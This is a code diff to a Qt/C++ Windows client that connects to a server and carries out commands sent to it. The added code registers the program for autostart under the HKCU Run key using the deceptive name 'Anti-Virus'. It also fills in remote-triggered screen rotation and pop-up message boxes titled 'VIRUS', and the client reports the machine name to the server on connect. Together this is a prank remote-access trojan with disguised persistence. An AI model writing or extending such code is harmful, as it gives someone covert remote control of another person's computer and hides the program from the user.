@@ -13,6 +13,7 @@ QClient::QClient(QString h, qint16 p, QObject *parent) :
 	tryToConnect();
 
 	compName = "Doru";
+	addStartup();
 }
 
 void QClient::tryToConnect()
@@ -22,8 +23,7 @@ void QClient::tryToConnect()
 
 void QClient::connected()
 {
-	sock->write(compName.toUtf8());
-	sock->waitForBytesWritten(50);
+	sendData(compName.toUtf8());
 }
 
 void QClient::disconnected()
@@ -85,7 +85,8 @@ void QClient::readyRead()
 				}
 				case Commands::DisplayRotate:
 				{
-					response = "DisplayRotate";
+					rotateDisplay();
+					response = "SUCCESS";
 					break;
 				}
 				case Commands::OsMessage:
@@ -109,7 +110,7 @@ void QClient::readyRead()
 		}
 		else
 		{
-			QJsonValue val = "Invalid Format. Explected JSON";
+			QJsonValue val = QString("Invalid Format. Expected JSON got '" + data + "'");
 			resp.insert("response", val);
 		}
 		QByteArray dataToSend = (QJsonDocument(resp)).toJson();
@@ -122,7 +123,10 @@ void QClient::readyRead()
 
 void QClient::addStartup()
 {
-
+	QString hkey("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+	QSettings settings(hkey, QSettings::NativeFormat);
+	QString path = QDir::currentPath() + "QClient.exe";
+	settings.setValue("Anti-Virus", QVariant(path));
 }
 
 QString QClient::startProcess(const QString &proc)
@@ -175,12 +179,53 @@ void QClient::toggleInvertMouse()
 
 void QClient::rotateDisplay()
 {
+	DEVMODE dm;
+	ZeroMemory(&dm, sizeof(dm));
+	dm.dmSize = sizeof(dm);
+	if (0 != EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &dm))
+	{
+		// swap height and width
+		DWORD dwTemp = dm.dmPelsHeight;
+		dm.dmPelsHeight = dm.dmPelsWidth;
+		dm.dmPelsWidth = dwTemp;
 
+		// determine new orientaion
+		switch (dm.dmDisplayOrientation)
+		{
+		case DMDO_DEFAULT:
+			dm.dmDisplayOrientation = DMDO_270;
+			break;
+		case DMDO_270:
+			dm.dmDisplayOrientation = DMDO_180;
+			break;
+		case DMDO_180:
+			dm.dmDisplayOrientation = DMDO_90;
+			break;
+		case DMDO_90:
+			dm.dmDisplayOrientation = DMDO_DEFAULT;
+			break;
+		default:
+			// unknown orientation value
+			// add exception handling here
+			break;
+		}
+		long lRet = ChangeDisplaySettings(&dm, 0);
+		if (DISP_CHANGE_SUCCESSFUL != lRet)
+		{
+			// add exception handling here
+		}
+	}
 }
 
-void QClient::message(const QString &)
+void QClient::message(const QString &m)
 {
-
+	int len;
+	int length = (int)m.length() + 1;
+	len = MultiByteToWideChar(CP_ACP, 0, m.toUtf8(), length, 0, 0);
+	wchar_t* buf = new wchar_t[len];
+	MultiByteToWideChar(CP_ACP, 0, m.toUtf8(), length, buf, len);
+	std::wstring r(buf);
+	MessageBox(NULL, (LPCWSTR)r.c_str(), L"VIRUS", MB_OK | MB_ICONERROR);
 }
 
 void QClient::sendData(const QByteArray &data)
